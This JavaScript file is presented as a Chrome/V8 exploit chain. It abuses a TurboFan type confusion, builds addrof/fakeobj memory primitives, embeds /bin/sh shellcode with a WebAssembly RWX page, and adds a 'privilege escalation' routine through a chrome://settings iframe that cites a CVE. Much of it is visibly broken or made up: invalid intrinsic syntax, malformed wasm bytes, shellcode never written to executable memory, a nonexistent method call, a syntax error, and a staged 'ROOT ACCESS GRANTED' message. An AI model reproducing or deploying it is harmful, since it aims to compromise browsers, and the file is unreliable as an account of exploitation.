// setup
let ab = new ArrayBuffer(0x100);
let f64 = new Float64Array(ab);
let u32 = new Uint32Array(ab);

function ftoi(val) {
    f64[0] = val;
    return u32[0] + u32[1] * 0x100000000;
}

function itof(val) {
    u32[0] = val % 0x100000000;
    u32[1] = val / 0x100000000;
    return f64[0];
}

function hex(x) {
    return '0x' + x.toString(16);
}

// corrupt turbofan optimization
let float_array = [1.1, 2.2];
let obj_array = [{}, {}];
let container = {marker: 1337};

function trigger(o, f) {
    o[0] = 1.1;
    f();
    o[0] = container;
}

for (let i = 0; i < 10000; i++) trigger(float_array, () => {});
OptimizeFunctionOnNextCall(trigger);

trigger(float_array, () => {
    float_array[0] = container;
});

let corrupted = float_array[0];
console.log("[+] CORRUPTED OBJECT:", corrupted);

// construct read/write primitives
function addrof(obj) {
    obj_array[0] = obj;
    return ftoi(float_array[0]);
}

function fakeobj(addr) {
    float_array[0] = itof(addr);
    return obj_array[0];
}

// SPRAY WASM FOR RWX
let shellcode = new Uint8Array([
  0x48, 0x31, 0xc0, 0x50,
  0x48, 0xbb, 0x2f, 0x62,
  0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x53, 0x48, 0x89,
  0xe7, 0x50, 0x57, 0x48,
  0x89, 0xe6, 0xb0, 0x3b,
  0x0f, 0x05
]);

let wasmCode = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d,
  0x01, 0x00, 0x00, 0x00,
  0x01, 0x0a, 0x02, 0x60,
  0x00, 0x00, 0x60, 0x00,
  0x00, 0x03, 0x03, 0x02,
  0x00, 0x01, 0x07, 0x07,
  0x01, 0x03, 0x72, 0x75,
  0x6e, 0x00, 0x01, 0x0a,
  0x09, 0x02, 0x02, 0x00,
  0x0b, 0x04, 0x00, 0x41,
  0x00, 0x0b
]);

let mod = new WebAssembly.Module(wasmCode);
let instance = new WebAssembly.Instance(mod);
let rwx_func = instance.exports.run;

let rwx_addr = addrof(rwx_func);
console.log("[+] RWX FUNC ADDR:", hex(rwx_addr));

// make array pointing to rwx address
let fake_array = new Uint8Array(0x100); // symbolic
for (let i = 0; i < shellcode.length; i++) {
    fake_array[i] = shellcode[i];
}

// exec
console.log("[+] EXECUTING SHELLCODE...");
rwx_func(); // finished

// POST EXPLOITATION PAYLOAD INJECTION
function escalatePrivileges() {
    let iframe = document.createElement("iframe");
    iframe.src = "chrome://settings/help"; // bypassable internal page "potentially get full system privileges" CVE-2025-0447
    iframe.onload = () => {
        console.log("[+] ESCALATION FRAME LOADED");


        try {
            let internalWindow = iframe.contentWindow;
            internalWindow.localStorage.setItem("devtools", "true");
            internalWindow.onpagereveal(`
                navigator.__defineGetter__('userAgent', () => 'rooted-browser/1337');
                Object.defineProperty(document, '__proto__, {
                get: function () {
                    console.log("[+] PRIV ESC SUCCESSFUL");
                    document.body.innerHTML = "<h1>ROOT ACCESS GRANTED</h1>";
                    return null;
                }
            });
        
        `);
            console.log("[+] PRIVILEGE ESCALATION CODE INJECTED");
        } catch (e) {
            console.log("[-] ESCALATION FAILED:", e);
        }
    };
    document.body.appendChild(iframe);
}
